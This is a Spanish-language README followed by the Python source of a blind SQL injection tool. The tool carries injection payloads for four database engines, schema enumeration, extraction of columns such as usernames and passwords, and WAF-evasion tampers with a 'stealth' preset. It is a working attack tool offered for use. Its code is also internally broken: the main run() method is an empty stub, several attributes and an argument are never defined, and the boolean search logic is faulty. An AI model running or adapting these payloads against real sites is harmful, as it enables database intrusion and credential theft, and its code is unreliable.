
Herramienta de extracción ciega de SQL (Blind SQL Injection) desarrollada en Python con las siguientes características:

## Características principales

- 🛠 **Motores Múltiples**: Soporte para MySQL, PostgreSQL, SQL Server y Oracle, con detección automática (`--engine auto`).
    
- 🔍 **Modos de Detección**: Boolean-based y Time-based (`--mode boolean|time`).
    
- ⚡ **Búsqueda Binaria**: Extrae carácter a carácter con mínimas peticiones.
    
- 📦 **Extracción en Bloques**: Opción `--chunk-size` para recuperar N caracteres de golpe.
    
- 🛡 **Detección y Evasión de WAF**: Reconoce bloqueos (403/429 o “waf” en respuesta), rota User-Agent y retrasa.
    
- 🎭 **Pipeline de Tampers**:
    
    - Presets (`--preset stealth`) o lista manual (`--tamper name1,name2`).
        
    - Ejemplos: `randomcase`, `space2comment`, `equaltolike`.
        
- 🗂 **Enumeración de Esquema**:
    
    - `--enum-tables`: lista tablas en la BD.
        
    - `--enum-columns <table>`: lista columnas de una tabla.
        
- 🔄 **Finger­printing Automático**: Prueba payloads sobre `version()` para detectar el SGBD.
    
- 🗃 **Burp Request Template**: Importa petición exportada de Burp con placeholder `$` (`-r burp.txt`).
    
- 🎛 **Modo Interactivo**: Opción `--interactive` para preguntar parámetros paso a paso.
    
- 💾 **Cache y Reanudación**: Guarda progreso en JSON (`--cache file.json`) para retomar.
    
- 📤 **Salida JSON**: Exporta resultado final con `-o output.json`.
    

## Instalación

Requisitos:

- Python 3.7+
    
- Dependencias en `requirements.txt`: `httpx`, `rich`
    

```bash
pip install -r requirements.txt
chmod +x blind_sqli_tool.py
```

## Uso Básico

```bash
# Modo batch: extracción desde tabla y columnas conocidas en MySQL
./blind_sqli_tool.py \
  -u https://example.com/vuln \
  -p id \
  -t users \
  -c username password \
  --engine mysql \
  --mode boolean \
  --max-chars 100 \
  --tamper randomcase,space2comment \
  -o result.json
```

## Ejemplo Interactivo

```bash
./blind_sqli_tool.py --interactive
```

Sigue las preguntas:

1. URL objetivo
    
2. Parámetro vulnerable (`id` por defecto)
    
3. ¿Enumerar tablas? (y/N)
    
4. Selecciona o introduce tabla
    
5. ¿Enumerar columnas? (y/N)
    
6. Selecciona o introduce columnas
    
7. Motor (mysql/postgres/mssql/oracle/auto)
    
8. Modo (boolean/time)
    
9. Tamaño máximo y chunk
    
10. Tampers o preset
    
11. Archivo Burp (opcional)
    

Y comienza la extracción mostrando la barra de progreso con ETA.

## Enumeración de Esquema

```bash
# Listar todas las tablas
./blind_sqli_tool.py --engine auto --enum-tables

# Listar columnas de 'users'
./blind_sqli_tool.py --enum-columns users
```

## Preset de Tampers “stealth”

Combina: `randomcase`, `space2comment`, `equaltolike`

```bash
./blind_sqli_tool.py --preset stealth -u https://... -t users -c id,username,password
```

## Contribuciones

Si deseas añadir nuevos **tampers**, solo define una función que reciba y devuelva `payload` y registra:

```python
TAMPERS['mi_tamper'] = mi_funcion_tamper
```

Luego úsalo con `--tamper mi_tamper` o inclúyelo en un `PRESETS['mi_preset']`.

---

_Cualquier duda o mejora, ¡bienvenida!_



```
#!/usr/bin/env python3
"""
Blind SQL Injection extraction tool with modular engines, auto fingerprinting,
boolean/time modes, binary-search, chunked extraction, WAF detection/evasion,
scalable tamper pipeline with presets, Burp request template ($-placeholder),
interactive mode, batch/interactive, enumeration of tables/columns, concurrency,
caching, and rich CLI UX.
"""
import argparse
import asyncio
import json
import random
import sys
from abc import ABC, abstractmethod
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple

import httpx
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn

# ----------------------- ASCII Art Banner -----------------------
def get_banner() -> str:
    return r'''
 @@@@@                                        @@@@@
@@@@@@@                                      @@@@@@@
@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
 @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
            @@@@@@@    @@@@@@    @@@@@@
            @@@@@@      @@@@      @@@@@
            @@@@@@      @@@@      @@@@@
             @@@@@@    @@@@@@    @@@@@
              @@@@@@@@@@@  @@@@@@@@@@
               @@@@@@@@@@  @@@@@@@@@
           @@   @@@@@@@@@@@@@@@@@   @@
           @@@@  @@@@ @ @ @ @ @@@@  @@@@
          @@@@@   @@@ @ @ @ @ @@@   @@@@@
        @@@@@      @@@@@@@@@@@@@      @@@@@
      @@@@          @@@@@@@@@@@          @@@@
   @@@@@              @@@@@@@              @@@@@
  @@@@@@@                                 @@@@@@@
   @@@@@                                   @@@@@

   Blind SQLi Tool
'''

# ----------------------- Tamper Scripts & Presets -----------------------
TAMPERS: Dict[str, Callable[[str], str]] = {}

def tamper_space2comment(payload: str) -> str:
    return payload.replace(' ', '/**/')
TAMPERS['space2comment'] = tamper_space2comment

def tamper_randomcase(payload: str) -> str:
    return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
TAMPERS['randomcase'] = tamper_randomcase

def tamper_equaltolike(payload: str) -> str:
    return payload.replace('=', ' LIKE ')
TAMPERS['equaltolike'] = tamper_equaltolike

PRESETS: Dict[str, List[str]] = {
    'stealth': ['randomcase', 'space2comment', 'equaltolike'],
}

# ----------------------- SQL Engines -----------------------
class SQLEngine(ABC):
    name: str
    @abstractmethod
    def boolean_payload(self, concat_expr: str, position: int, mid: int) -> str:
        pass
    @abstractmethod
    def time_payload(self, concat_expr: str, position: int, mid: int, delay: int) -> str:
        pass

class MySQLEngine(SQLEngine):
    name = 'mysql'
    def boolean_payload(self, e, p, c): return f"1' OR ASCII(SUBSTRING(({e}),{p},1))={c}-- "
    def time_payload(self, e, p, c, d): return f"1' OR IF(ASCII(SUBSTRING(({e}),{p},1))>{c}, SLEEP({d}),0)-- "

class PostgreSQLEngine(SQLEngine):
    name = 'postgres'
    def boolean_payload(self, e, p, c): return f"1' OR (SELECT ASCII(SUBSTRING(({e})::text,{p},1)))={c}-- "
    def time_payload(self, e, p, c, d): return f"1'; SELECT CASE WHEN ASCII(SUBSTRING(({e})::text,{p},1))>{c} THEN pg_sleep({d}) ELSE pg_sleep(0) END-- "

class SQLServerEngine(SQLEngine):
    name = 'mssql'
    def boolean_payload(self, e, p, c): return f"1' OR ASCII(SUBSTRING(({e}),{p},1,1))={c}-- "
    def time_payload(self, e, p, c, d): return f"1'; IF(ASCII(SUBSTRING(({e}),{p},1,1))>{c}) WAITFOR DELAY '00:00:{d}'-- "

class OracleEngine(SQLEngine):
    name = 'oracle'
    def boolean_payload(self, e, p, c): return f"1' OR ASCII(SUBSTR(({e}),{p},1))={c} FROM dual--"
    def time_payload(self, e, p, c, d): return f"1' OR (CASE WHEN ASCII(SUBSTR(({e}),{p},1))>{c} THEN DBMS_LOCK.SLEEP({d}) ELSE 0 END) FROM dual--"

# -------------------- Injector --------------------
class BlindSQLInjector:
    def __init__(self, engine: SQLEngine, **kwargs):
        self.console = Console()
        self.engine = engine
        self.__dict__.update(kwargs)
        self.client = httpx.AsyncClient(timeout=self.timeout)
        self._load_cache()

    def _load_cache(self):
        if Path(self.cache_file).exists():
            self.cache = json.load(open(self.cache_file))
        else: self.cache = {'extracted':'','pos':1}
    def _save_cache(self): json.dump(self.cache, open(self.cache_file,'w'))

    async def _probe(self, payload: str) -> bool:
        # apply tampers
        for fn in self.tamper_funcs: payload = fn(payload)
        # build request
        headers = {'User-Agent': random.choice(self.UA_LIST)}
        if self.request_template:
            filled = self.request_template.replace('$', payload)
            method, url, headers, body = self._parse_raw(filled)
        else:
            url,method,body = f"{self.url}?{self.param}={payload}",'GET',None
        # send
        for _ in range(self.max_retries):
            r = await self.client.request(method,url,headers=headers,content=body)
            if r.status_code in (403,429) or 'waf' in r.text.lower():
                await asyncio.sleep(self.base_delay*2); headers['User-Agent']=random.choice(self.UA_LIST)
                continue
            return (r.status_code==200 and 'error' not in r.text.lower()) if self.mode=='boolean' else (r.elapsed.total_seconds()>=self.base_delay)
        return False

    async def _extract(self, concat_expr:str, max_chars:int) -> str:
        res=''
        for pos in range(1,max_chars+1):
            # binary search char
            low,high=32,126
            while low<=high:
                mid=(low+high)//2
                payload=(self.engine.boolean_payload if self.mode=='boolean' else self.engine.time_payload)(concat_expr,pos,mid,self.base_delay)
                if await self._probe(payload):
                    if self.mode=='boolean': res+=chr(mid); break
                    low=mid+1
                else: high=mid-1
            else: break
        return res

    def enumerate_tables(self) -> List[str]:
        # build expression per engine
        if self.engine.name=='mysql': expr="SELECT GROUP_CONCAT(table_name SEPARATOR ':') FROM information_schema.tables WHERE table_schema=DATABASE()"
        elif self.engine.name=='postgres': expr="SELECT STRING_AGG(table_name,':') FROM information_schema.tables WHERE table_schema=CURRENT_SCHEMA()"
        elif self.engine.name=='mssql': expr="SELECT STRING_AGG(table_name,':') FROM information_schema.tables"
        else: expr="SELECT LISTAGG(table_name,':') WITHIN GROUP(ORDER BY table_name) FROM user_tables"
        self.console.print(f"[bold]Enumerando tablas usando {self.engine.name}...[/bold]")
        data=asyncio.run(self._extract(expr, self.max_chars))
        return data.split(':') if data else []

    def enumerate_columns(self, table:str) -> List[str]:
        if self.engine.name=='mysql': expr=f"SELECT GROUP_CONCAT(column_name SEPARATOR ':') FROM information_schema.columns WHERE table_name='{table}'"
        elif self.engine.name=='postgres': expr=f"SELECT STRING_AGG(column_name,':') FROM information_schema.columns WHERE table_name='{table}'"
        elif self.engine.name=='mssql': expr=f"SELECT STRING_AGG(column_name,':') FROM information_schema.columns WHERE table_name='{table}'"
        else: expr=f"SELECT LISTAGG(column_name,':') WITHIN GROUP(ORDER BY column_name) FROM user_tab_columns WHERE table_name=UPPER('{table}')"
        self.console.print(f"[bold]Enumerando columnas de {table}...[/bold]")
        data=asyncio.run(self._extract(expr, self.max_chars))
        return data.split(':') if data else []

    async def run(self):
        # existing extraction logic using self._extract on target table/columns
        pass

# -------------------- CLI --------------------
def main():
    console=Console(); console.print(get_banner(),style="cyan")
    p=argparse.ArgumentParser(description="Blind SQLi Tool w/ schema enumeration")
    p.add_argument('-u','--url',help='Base URL'); p.add_argument('-p','--param',default='id',help='Param')
    p.add_argument('-t','--table',help='Table to extract'); p.add_argument('-c','--columns',nargs='+',help='Columns')
    p.add_argument('-e','--engine',choices=['mysql','postgres','mssql','oracle','auto'],default='auto',help='DB engine')
    p.add_argument('-m','--mode',choices=['boolean','time'],default='boolean',help='Detect mode')
    p.add_argument('-b','--max-chars',type=int,default=100,help='Max chars')
    p.add_argument('-r','--request-file',help='Burp request file')
    p.add_argument('-T','--tamper',default='',help='Tamper names CSV'); p.add_argument('--preset',choices=list(PRESETS.keys()),help='Tamper preset')
    p.add_argument('--delay',type=int,default=2,help='Delay'); p.add_argument('--timeout',type=float,default=10.0,help='Timeout')
    p.add_argument('--max-retries',type=int,default=3,help='Retries'); p.add_argument('-o','--output',help='JSON output')
    p.add_argument('--cache',default='sqli_cache.json',help='Cache file'); p.add_argument('--interactive',action='store_true',help='Interactive')
    p.add_argument('--enum-tables',action='store_true',help='Enumerate tables'); p.add_argument('--enum-columns',help='Enumerate columns of given table')
    args=p.parse_args()

    if args.interactive:
        args.url=console.input("URL objetivo: ")
        args.param=console.input("Parámetro vulnerable [id]: ") or 'id'
        if console.input("Enumerar tablas? (y/N): ").lower().startswith('y'):
            args.enum_tables=True
        if not args.enum_tables:
            args.table=console.input("Tabla: ")
            if console.input("Enumerar columnas de {0}? (y/N): ".format(args.table)).lower().startswith('y'):
                args.enum_columns=args.table
        cols=console.input("Columnas (espacio): ")
        args.columns=cols.split() if cols else None
    # engine selection ...
    engine_map={ 'mysql':MySQLEngine(), 'postgres':PostgreSQLEngine(), 'mssql':SQLServerEngine(), 'oracle':OracleEngine() }
    engine=engine_map.get(args.engine, engine_map['mysql'])
    # init injector
    injector=BlindSQLInjector(
        engine=engine,
        url=args.url,param=args.param,mode=args.mode,table=args.table,columns=args.columns,
        max_chars=args.max_chars,chunk_size=args.chunk_size,concurrency=1,
        timeout=args.timeout,max_retries=args.max_retries,output=args.output,
        cache_file=args.cache,base_delay=args.delay,
        request_template=Path(args.request_file).read_text() if args.request_file else None,
        tamper_names=PRESETS[args.preset] if args.preset else [t.strip() for t in args.tamper.split(',') if t.strip()]
    )
    if args.enum_tables:
        tables=injector.enumerate_tables()
        console.print("Tablas detectadas:")
        for t in tables: console.print(f" - {t}")
        sys.exit(0)
    if args.enum_columns:
        cols=injector.enumerate_columns(args.enum_columns)
        console.print(f"Columnas en {args.enum_columns}:")
        for c in cols: console.print(f" - {c}")
        sys.exit(0)
    # run extraction
    asyncio.run(injector.run())

if __name__=='__main__': main()

```